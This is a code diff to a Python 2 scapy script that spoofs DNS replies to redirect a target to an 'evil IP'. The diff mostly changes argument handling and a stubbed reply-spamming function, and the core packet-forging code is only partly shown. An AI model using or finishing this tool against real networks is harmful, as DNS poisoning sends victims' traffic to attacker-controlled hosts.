@@ -2,6 +2,7 @@
 from scapy.all import *
 import argparse
 import thread
+import sys
 
 evil_ip = "9.9.9.9"
 
@@ -31,14 +32,10 @@ def attack(packet):
 	send(poison, inter=0, loop=0, verbose=0)
 	
 #spam client with DNS replies
-def spam_replies(evil_ip, target):
+def spam_replies(target, realDNS, spam_time):
 	print "About to spam " + target + " with IP: " + evil_ip
 
-	#spam_response = IP(dst=target)\UDP(dport=53)
-
 def main():
-	#Args -e <IP of site to redirect user>, -d <DNS Server if known>
-	# -t <target>, -n <noisy>
 	
 	parser = argparse.ArgumentParser(description='Some fun stuff with DNS')
 
@@ -49,11 +46,19 @@ def main():
 	parser.add_argument("-t", "--target", help="the target IP")
 	args = parser.parse_args()
 	
-	
-	sniff_dns(args.secs)
-	#if args.noisy != None:
-	#	spam_replies(args.evil, args.target)
+	#Checking
+	if args.evil == None:
+		print "You must enter an evil IP"
+		sys.exit()
+	else:
+		evil_ip = args.evil
+		
+	if args.noisy != None:
+		spam_replies(args.target, args.DNS, args.secs)
+	else:
+		sniff_dns(args.secs)
 
+	print "Finished"
 
 
 if __name__=="__main__":
